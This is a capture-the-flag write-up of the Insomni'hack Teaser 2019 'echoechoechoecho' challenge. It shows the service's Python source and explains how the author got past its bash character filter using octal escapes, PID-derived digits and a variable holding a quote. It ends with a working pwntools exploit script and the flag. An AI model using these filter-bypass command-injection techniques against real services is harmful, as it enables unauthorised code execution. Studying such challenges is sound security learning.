---
title: echoechoechoecho - Insomni'hack Teaser 2019
date: '2019-01-22 12:02:04'
layout: post
---

> Echo echo echo echo, good luck
> 
> Terminal  nc 35.246.181.187 1337

*216 Pts, 18 solved, pwn*



This was a great little challenge that we managed to solve 30 minutes too late and so didnt get the points, but it was  still very satisfying to finally see the flag.



After connecting the the server we are given a prompt `Hi, what would you like to echo today? (make sure to try 'thisfile')` and if we send `thisfile` we are given the source to the challenge:



```python
#!/usr/bin/env python3

from os import close
from random import choice
import re
from signal import alarm
from subprocess import check_output
from termcolor import colored

alarm(10)

colors = ["red","blue","green","yellow","magenta","cyan","white"]
# thanks http://patorjk.com/software/taag/#p=display&h=0&f=Crazy&t=echo
banner = """
                            _..._                 .-'''-.
                         .-'_..._''.             '   _    \\
       __.....__       .' .'      '.\  .       /   /` '.   \\
   .-''         '.    / .'           .'|      .   |     \  '
  /     .-''"'-.  `. . '            <  |      |   '      |  '
 /     /________\   \| |             | |      \    \     / /
 |                  || |             | | .'''-.`.   ` ..' /
 \    .-------------'. '             | |/.'''. \  '-...-'`
  \    '-.____...---. \ '.          .|  /    | |
   `.             .'   '. `._____.-'/| |     | |
     `''-...... -'       `-.______ / | |     | |
                                  `  | '.    | '.
                                     '---'   '---'
"""

def bye(s=""):
    print(s)
    print("bye")
    exit()

def check_input(payload):
    if payload == 'thisfile':
        bye(open("/bin/shell").read())

    if not all(ord(c) < 128 for c in payload):
        bye("ERROR ascii only pls")

    if re.search(r'[^();+$\\= \']', payload.replace("echo", "")):
        bye("ERROR invalid characters")

    # real echolords probably wont need more special characters than this
    if payload.count("+") > 1 or \
            payload.count("'") > 1 or \
            payload.count(")") > 1 or \
            payload.count("(") > 1 or \
            payload.count("=") > 2 or \
            payload.count(";") > 3 or \
            payload.count(" ") > 30:
        bye("ERROR Too many special chars.")

    return payload


# print(colored(banner, choice(colors)))
print("Hi, what would you like to echo today? (make sure to try 'thisfile')")
payload = check_input(input())


print("And how often would you like me to echo that?")
count = max(min(int(input()), 10), 0)

payload += "|bash"*count

close(0)
result = check_output(payload, shell=True, executable="/bin/bash")
bye(result.decode())
```



So we the basic idea is the we can run `payload`, `payload | bash`, `payload | bash | bash`etc. The catch is that we can only using the characters  `^();+$\\= \'`and the word `echo`. There is also a limit on the number of times each is used, with the exception of `\` and `$` which can be used as many times as we want.



A bit of playing around shows that if our payload is `echo $$` then the pid is always `8`, and it we run it multiple times but escape the dollar signs we can get a few more pids as they increase:

```textile
Hi, what would you like to echo today? (make sure to try 'thisfile')
echo echo echo $$ \$\$ \\$\\$
And how often would you like me to echo that?
2
8 10 11
```

After a bit more thinking and searching we found that you can use `echo` to create any character from the octal code, eg `echo $'\052'` is `*`. The problem is that we can only use a single `'`and we need two of them. We can work around this by assigning it to a variable, then using that instead:

```textile
Hi, what would you like to echo today? (make sure to try 'thisfile')
echoecho=\'; echo $echoecho $$  $echoecho
And how often would you like me to echo that?
0
' 8 '
```

The last trick to get the remaining numbers we need is that if we add a `$` before echoing a number, it will remove the first digit. This lets us get the numbers 0-7 using the pids 10-17: `echo $10$15$12` is `052`. 



So now we have all the parts we need to build up an arbitrary string to execute commands, we just need to escape everything with the correct number of backslashes. After quite a long time I finally had a function to encode strings and could start running commands.



Listing the filesystem shows that the is `flag` (unreadable) and `get_flag`, but running `get_flag` results in:

```textile
Please solve this little captcha:
2259669573 + 2946304989 + 1862097959 + 4143633715 + 2756660880
13968367116 != 0 :(

bye
```

At this stage there was only a few minutes of the ctf left and it was over before we worked out how to solve the captcha :(



After a bit more discussion @tempestuous from my team OpenToAll provided the following snippet to run and solve the captcha, which (after fixing my script a bit) got us the flag:

```bash
bash -c 'echo $(($(grep + /tmp/a)))'|/g*>/tmp/a;cat /tmp/a
```



`INS{echo_echoecho_echo__echoech0echo_echoechoechoecho_bashbashbashbash}`



final.py:

```python
#!/usr/bin/env python2
from pwn import *

# quote variable
Q1="echoecho";

# escape sequences
V0 = "\\"*2
V1 = "\\"*(2 + 4)
V2 = "\\"*(2 + 4 + 8)
V3 = "\\"*(2 + 4 + 8 + 15)
V4 = "\\"*(2 + 4 + 8 + 16 + 32)
V5 = "\\"*(2 + 4 + 8 + 16 + 32 + 64)
V6 = "\\"*(2 + 4 + 8 + 16 + 32 + 64 + 128)
V7 = "\\"*(2 + 4 + 8 + 16 + 32 + 64 + 128 + 256)
V8 = "\\"*(2 + 4 + 8 + 16 + 32 + 64 + 128 + 256 + 512)

# digits
C0 = "{}$\\$\\$".format(V0)
C1 = "{}${}${}$".format(V1, V0, V0)
C2 = "{}${}${}$".format(V2, V1, V1)
C3 = "{}${}${}$".format(V3, V2, V2)
C4 = "{}${}${}$".format(V4, V3, V3)
C5 = "{}${}${}$".format(V5, V4, V4)
C6 = "{}${}${}$".format(V6, V5, V5)
C7 = "{}${}${}$".format(V7, V6, V6)

C13 = "{}${}$".format(V2, V2)
C14 = "{}${}$".format(V3, V3)
C15 = "{}${}$".format(V4, V4)
C16 = "{}${}$".format(V5, V5)
C17 = "{}${}$".format(V6, V6)

def get_char(c):
	if c == " ":
		return c

	nums = oct(ord(c))
	if len(nums) > 3:
		nums = nums[1:]
	if nums[0] == "1":
		raw = "{V8}{V7}" + "{C%c%c}{C%c}"%(nums[0],nums[1],nums[2]) 
	else:
		raw = "{V8}{V7}" + "{C%c}{C%c}{C%c}"%(nums[0],nums[1],nums[2])
	base = raw.format(V7=V7, V8=V8, 
			C0=C0, C1=C1, C2=C2, C3=C3, C4=C4, C5=C5, C6=C6, C7=C7,
			C13=C13, C14=C14, C15=C15, C16=C16, C17=C17).strip()
	return base

def get_string(s):
	p = "{V7}${V8}${Q1}".format(Q1=Q1, V7=V7, V8=V8)  # $'
	for c in s:
		p += get_char(c)
	return p + "{V8}${Q1}".format(Q1=Q1, V8=V8).strip() # '

cmd = """bash -c 'echo $(($(grep + /tmp/a)))'|/g*>/tmp/a;cat /tmp/a"""

payload = """
{}=\\'; echo echo echo echo echo echo echo echo echo echo {}
""".format(Q1, get_string("bash") + " " + get_string("-c") + " " + get_string(cmd))

payload = payload.strip()
times = 10

if len(sys.argv) > 1:
	p = remote("35.246.181.187", 1337)
else:
	p = process("docker run --rm -i -v `pwd`:/ctf -v `pwd`/flag:/flag -v `pwd`/shell:/bin/shell -v `pwd`/get_flag:/get_flag python:3-slim bash -c 'date; python3 /bin/shell'", shell=True)

p.sendlineafter("'thisfile')", payload)
p.sendlineafter("that?", str(times))
p.interactive()

# INS{echo_echoecho_echo__echoech0echo_echoechoechoecho_bashbashbashbash}
```
